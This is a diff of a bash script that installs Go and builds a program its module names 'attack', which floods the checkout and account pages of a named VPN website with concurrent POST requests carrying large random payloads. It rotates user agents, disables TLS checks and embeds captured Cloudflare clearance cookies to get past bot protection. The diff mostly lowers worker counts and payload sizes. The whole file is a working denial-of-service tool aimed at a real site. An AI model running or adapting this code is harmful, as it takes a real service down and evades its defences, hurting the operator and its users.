@@ -1,20 +1,17 @@
 #!/bin/bash
 set -e
 
-# Установка Go, если нет
 if ! command -v go &> /dev/null; then
     echo "Устанавливаю Go..."
     wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
-    sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
+    tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
     export PATH=$PATH:/usr/local/go/bin
     echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
 fi
 
-# Создаём временную папку
 WORKDIR=$(mktemp -d)
 cd "$WORKDIR"
 
-# Пишем main.go (встраиваем код атаки)
 cat > main.go << 'EOF'
 package main
 
@@ -23,7 +20,6 @@ import (
 	"crypto/rand"
 	"crypto/tls"
 	"flag"
-	"fmt"
 	"io"
 	"math/big"
 	"net/http"
@@ -35,10 +31,10 @@ import (
 )
 
 const (
-	defaultWorkers        = 4000
-	defaultRequestTimeout = 30 * time.Second
-	minSize               = 1000000
-	maxSize               = 1500000
+	defaultWorkers        = 200
+	defaultRequestTimeout = 10 * time.Second
+	minSize               = 10000
+	maxSize               = 50000
 )
 
 var userAgents = []string{
@@ -63,8 +59,8 @@ type task struct {
 }
 
 func main() {
-	domain := flag.String("domain", "sdfg.ru", "email domain after @")
-	workers := flag.Int("workers", defaultWorkers, "number of parallel workers")
+	domain := flag.String("domain", "sdfg.ru", "email domain")
+	workers := flag.Int("workers", defaultWorkers, "workers")
 	flag.Parse()
 
 	tasks := make(chan task, *workers*2)
@@ -73,10 +69,10 @@ func main() {
 		Timeout: defaultRequestTimeout,
 		Transport: &http.Transport{
 			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
-			MaxIdleConns:        2000,
-			MaxIdleConnsPerHost: 2000,
-			MaxConnsPerHost:     2000,
-			IdleConnTimeout:     90 * time.Second,
+			MaxIdleConns:        *workers,
+			MaxIdleConnsPerHost: *workers,
+			MaxConnsPerHost:     *workers,
+			IdleConnTimeout:     30 * time.Second,
 		},
 	}
 
@@ -114,7 +110,7 @@ func worker(domain string, tasks <-chan task, client *http.Client, wg *sync.Wait
 		switch t.typ {
 		case cabinet:
 			payload := randomAlpha(t.size)
-			bodyStr := fmt.Sprintf(`["%s@%s"]`, payload, domain)
+			bodyStr := `["` + payload + `@` + domain + `"]`
 			req, err = http.NewRequest("POST", "https://durevpn.com/ru/cabinet", bytes.NewReader([]byte(bodyStr)))
 			if err != nil {
 				continue
@@ -123,11 +119,10 @@ func worker(domain string, tasks <-chan task, client *http.Client, wg *sync.Wait
 			req.Header.Set("next-action", "4042db2edc943b672fa3ac96f53c691573aa45b68c")
 			req.Header.Set("next-router-state-tree", `["",{"children":[["locale","ru","d"],{"children":["cabinet",{"children":["__PAGE__",{},null,null]},null,null]}},null,null,true]`)
 			req.Header.Set("Cookie", "NEXT_LOCALE=ru; cf_clearance=cRSxQVMi8f_nWisN3l93WTOjuiyXAKlMRYFdbg4KE94-1776024721-1.2.1.1-gCLVXVlHYNUbtLlYCn.59x5zUHIw2SjmzkTNDvWBAo1p6rMWRsvFZq6hc5mxtcxVzEXuzs1IDmJA6d9TIbHiEe1_sNfdQdo2w0npG4Z5CoEgl1Z6MmKqKk7.Apn3hNB_oFBrehwNi_Bg5Qtc_vCX7SdsrSCwiA5epZCPGl088JGarGt0D70McL0QX0jl5TiKSHZ0Io_pbkRocPs1zEwW9EKKuoA7WJ7nAw_L1x7kt1lJaco9BabAK_GAQDXYKeJttGKqM92ECNYemkDhSdt5DZJg909JKKBQF4Xl.17H2eM.tqe3Z91r7smFGHTDxzDskMGzKUE.9OhkrYG6aJZEQ")
-
 		case buy:
 			smallPayload := randomAlpha(20)
 			bigPayload := randomAlpha(t.size)
-			bodyStr := fmt.Sprintf(`["%s","%s@%s"]`, smallPayload, bigPayload, domain)
+			bodyStr := `["` + smallPayload + `","` + bigPayload + `@` + domain + `"]`
 			req, err = http.NewRequest("POST", "https://durevpn.com/ru/buy", bytes.NewReader([]byte(bodyStr)))
 			if err != nil {
 				continue
@@ -137,11 +132,9 @@ func worker(domain string, tasks <-chan task, client *http.Client, wg *sync.Wait
 			req.Header.Set("next-router-state-tree", `["",{"children":[["locale","ru","d"],{"children":["buy",{"children":["__PAGE__",{},null,null]},null,null]}},null,null,true]`)
 			req.Header.Set("Cookie", "NEXT_LOCALE=ru; cf_clearance=Vw8ohyaljxhfrvZKGXcOdMt6h.vlHewlzuvPz9cIbcg-1776025616-1.2.1.1-mrlquDyjhSK3JlmFKyiGSxdjVblKrbxeaYk1n4H_kv_KvBPtLf.vabUjeNwRi7Vfmvo0jHPs5WUL7t8Mi8sqhjLyulB4B3.HpIuk8TpJ9hXYYgIfUTg0l8JVjG8QGJLcGRjG2fh06ZjTepogQb0dD_GdhIcrD9B8xh4uqHEaGBVnC1HYEJMpya_Qu7bRdv_z9Q1U3pFWXkMfwWBg7_TB4O5798xkqS82qvukTuSAoFnFJiZedvv5OVHzML_kBdfzhMU7.6xAUIWMcoOLeBQcSItLkifo4pAwDVUVkoL58tybVYo7iqEbGlj9l8_ipxxwijDMmLqYU.0khZb3HJwZRQ")
 		}
-
 		if req == nil {
 			continue
 		}
-
 		uaIdx, _ := randInt(0, len(userAgents)-1)
 		req.Header.Set("User-Agent", userAgents[uaIdx])
 		req.Header.Set("Accept", "text/x-component")
@@ -170,31 +163,22 @@ func worker(domain string, tasks <-chan task, client *http.Client, wg *sync.Wait
 func randomAlpha(n int) string {
 	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 	b := make([]byte, n)
-	if _, err := rand.Read(b); err != nil {
-		for i := range b {
-			b[i] = letters[0]
-		}
-	} else {
-		for i := 0; i < n; i++ {
-			b[i] = letters[int(b[i])%len(letters)]
-		}
+	rand.Read(b)
+	for i := 0; i < n; i++ {
+		b[i] = letters[int(b[i])%len(letters)]
 	}
 	return string(b)
 }
 
 func randInt(min, max int) (int, error) {
-	if min == max {
-		return min, nil
-	}
 	n, err := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
 	if err != nil {
-		return 0, err
+		return min, nil
 	}
 	return int(n.Int64()) + min, nil
 }
 EOF
 
-# Запускаем
 go mod init attack 2>/dev/null || true
 go mod tidy 2>/dev/null || true
 go run main.go "$@"
